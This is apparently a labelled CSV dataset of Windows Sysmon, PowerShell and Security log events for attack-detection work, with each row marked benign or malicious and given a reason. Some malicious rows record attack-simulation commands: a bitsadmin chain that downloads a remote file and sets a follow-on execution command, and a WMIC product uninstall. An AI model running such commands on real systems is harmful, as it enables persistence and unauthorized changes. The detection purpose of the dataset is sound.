sample_id,label,source_type,attack_category,scenario_name,source_file,provider,channel,event_id,timestamp,computer,user,image,command_line,parent_image,target_object,destination_ip,destination_hostname,query_name,script_block_text,event_summary,label_reason
CYB499-001,Benign,Sysmon,,sysmon,data/raw/benign/sysmon.json,Microsoft-Windows-Sysmon,Microsoft-Windows-Sysmon/Operational,1,2025-04-17T16:44:00.9205352+00:00,Server002,SERVER002\lplui,C:\Program Files\BraveSoftware\Brave-Browser\Application\brave.exe,"""C:\Program Files\BraveSoftware\Brave-Browser\Application\brave.exe""",C:\Windows\explorer.exe,,,,,,"Sysmon event 1 from Microsoft-Windows-Sysmon on Server002; image=C:\Program Files\BraveSoftware\Brave-Browser\Application\brave.exe; cmd=""C:\Program Files\BraveSoftware\Brave-Browser\Application\brave.exe""; parent=C:\Windows\explorer.exe; parent_cmd=""C:\Windows\explorer.exe""; user=SERVER002\lplui; detail=Process creation",Selected from the benign baseline Sysmon log; the process activity is routine system or application behavior without the malicious-side patterns.
CYB499-002,Benign,PowerShell,,powershell,data/raw/benign/powershell.json,PowerShell,Windows PowerShell,400,2024-10-03T19:21:28.3838228+00:00,Server002,,,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -Command whoami,,,,,,"Available, None, 	NewEngineState=Available
	PreviousEngineState=None

	SequenceNumber=13

	HostName=ConsoleHost
	HostVersion=5.1.19041.2673
	HostId=8df8c3c6-8d62-47d7-8583-b1edaf8f1e3b
	HostApplication=C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -Command whoami
	EngineVersion=5.1.19041.2673
	RunspaceId=72a20c74-33ee-425f-a4e7-fa0c7e234cba
	PipelineId=
	CommandName=
	CommandType=
	ScriptName=
	CommandPath=
	CommandLine=",PowerShell event 400 from PowerShell on Server002; cmd=C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -Command whoami; detail=Engine state is changed from None to Available,Selected from the benign baseline PowerShell log; the host application shows routine shell startup or administrative commands without attack-specific indicators.
CYB499-003,Malicious,Sysmon,Persistence,persistence_persist_download_execute,data/raw/malicious/persistence_persist_download_execute_json/T1197-3_Microsoft-Windows-Sysmon_Operational.json,Microsoft-Windows-Sysmon,Microsoft-Windows-Sysmon/Operational,1,2024-10-25 17:02:54.5762390,Server002,SERVER002\admin_test,C:\Windows\System32\bitsadmin.exe,bitsadmin.exe  /setnotifycmdline fileBITS C:\Windows\system32\notepad.exe NULL,C:\Windows\System32\cmd.exe,,,,,,"Sysmon event 1 from Microsoft-Windows-Sysmon on Server002; image=C:\Windows\System32\bitsadmin.exe; cmd=bitsadmin.exe /setnotifycmdline fileBITS C:\Windows\system32\notepad.exe NULL; parent=C:\Windows\System32\cmd.exe; parent_cmd=""cmd.exe"" /c bitsadmin.exe /create fileBITS & bitsadmin.exe /addfile fileBITS https://raw.githubusercontent.com/file/file-file/master/files/data/data.md %temp%\bitsadmin3_flag.p...; user=SERVER002\admin_test",The command chain uses BITSAdmin to download content and set a notify command for follow-on execution. Evidence: bitsadmin.exe /setnotifycmdline fileBITS C:\Windows\system32\notepad.exe NULL
CYB499-004,Benign,Security,,security,data/raw/benign/security.json,Microsoft-Windows-Security-Auditing,Security,5058,2025-04-23T19:01:44.7316073+00:00,Server002,LOCAL SERVICE,,,,,,,,,Security event 5058 from Microsoft-Windows-Security-Auditing on Server002; user=LOCAL SERVICE,Selected from the benign baseline Security log; this is routine Windows audit activity rather than an attack-specific event.
CYB499-005,Malicious,Sysmon,Execution,execution-app-uninstall-using-wmic,data/raw/malicious/execution-app-uninstall-using-wmic-json/T1047-10_Microsoft-Windows-Sysmon_Operational.json,Microsoft-Windows-Sysmon,Microsoft-Windows-Sysmon/Operational,1,2024-10-22 15:28:00.8661991,Server002,SERVER002\admin_test,C:\Windows\System32\cmd.exe,"""cmd.exe"" /c wmic /node:""127.0.0.1"" product where ""name like 'Tightvnc%%%%'"" call uninstall",C:\Windows\System32\wsmprovhost.exe,,,,,,"Sysmon event 1 from Microsoft-Windows-Sysmon on Server002; image=C:\Windows\System32\cmd.exe; cmd=""cmd.exe"" /c wmic /node:""127.0.0.1"" product where ""name like 'Tightvnc%%%%'"" call uninstall; parent=C:\Windows\System32\wsmprovhost.exe; parent_cmd=C:\Windows\system32\wsmprovhost.exe -Embedding; user=SERVER002\admin_test","The event uses WMIC to uninstall a target product over WMI, which is execution behavior tied to the scenario. Evidence: ""cmd.exe"" /c wmic /node:""127.0.0.1"" product where ""name like 'Tightvnc%%%%'"" call uninstall"
CYB499-006,Malicious,Sysmon,Execution,execution-app-uninstall-using-wmic,data/raw/malicious/execution-app-uninstall-using-wmic-json/T1047-10_Microsoft-Windows-Sysmon_Operational.json,Microsoft-Windows-Sysmon,Microsoft-Windows-Sysmon/Operational,5,2024-10-22 15:28:03.4495550,Server002,SERVER002\admin_test,C:\Windows\System32\wbem\WMIC.exe,,,,,,,,Sysmon event 5 from Microsoft-Windows-Sysmon on Server002; image=C:\Windows\System32\wbem\WMIC.exe; user=SERVER002\admin_test,"The event uses WMIC to uninstall a target product over WMI, which is execution behavior tied to the scenario. Evidence: C:\Windows\System32\wbem\WMIC.exe"
CYB499-007,Benign,Security,,security,data/raw/benign/security.json,Microsoft-Windows-Security-Auditing,Security,5059,2025-04-23T19:01:44.7350827+00:00,Server002,LOCAL SERVICE,,,,,,,,,Security event 5059 from Microsoft-Windows-Security-Auditing on Server002; user=LOCAL SERVICE,Selected from the benign baseline Security log; this is routine Windows audit activity rather than an attack-specific event.
CYB499-008,Benign,PowerShell,,powershell,data/raw/benign/powershell.json,PowerShell,Windows PowerShell,400,2024-10-03T19:55:23.8415066+00:00,Server002,,,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -Command ~/Desktop/test.ps1,,,,,,"Available, None, 	NewEngineState=Available
	PreviousEngineState=None

	SequenceNumber=13

	HostName=ConsoleHost
	HostVersion=5.1.19041.2673
	HostId=8489a2ed-03f4-42e2-8830-df6264a1b8bb
	HostApplication=C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -Command ~/Desktop/test.ps1
	EngineVersion=5.1.19041.2673
	RunspaceId=b98d4c53-3b3b-4293-8fc1-b61d94a0ba76
	PipelineId=
	CommandName=
	CommandType=
	ScriptName=
	CommandPath=
	CommandLine=",PowerShell event 400 from PowerShell on Server002; cmd=C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -Command ~/Desktop/test.ps1; detail=Engine state is changed from None to Available,Selected from the benign baseline PowerShell log; the host application shows routine shell startup or administrative commands without attack-specific indicators.
CYB499-009,Benign,Security,,security,data/raw/benign/security.json,Microsoft-Windows-Security-Auditing,Security,4624,2025-04-23T19:01:06.9390403+00:00,Server002,WORKGROUP\SERVER002$,C:\Windows\System32\services.exe,C:\Windows\System32\services.exe,,,,,,,Security event 4624 from Microsoft-Windows-Security-Auditing on Server002; image=C:\Windows\System32\services.exe; cmd=C:\Windows\System32\services.exe; user=WORKGROUP\SERVER002$; detail=Successful logon,Selected from the benign baseline Security log; this is routine Windows audit activity rather than an attack-specific event.
CYB499-010,Benign,Security,,security,data/raw/benign/security.json,Microsoft-Windows-Security-Auditing,Security,4648,2025-04-30T10:09:32.2347107+00:00,Server002,WORKGROUP\SERVER002$,C:\Windows\System32\winlogon.exe,C:\Windows\System32\winlogon.exe,,,,,,,Security event 4648 from Microsoft-Windows-Security-Auditing on Server002; image=C:\Windows\System32\winlogon.exe; cmd=C:\Windows\System32\winlogon.exe; user=WORKGROUP\SERVER002$; detail=A logon was attempted using explicit credentials,Selected from the benign baseline Security log; this is routine Windows audit activity rather than an attack-specific event.
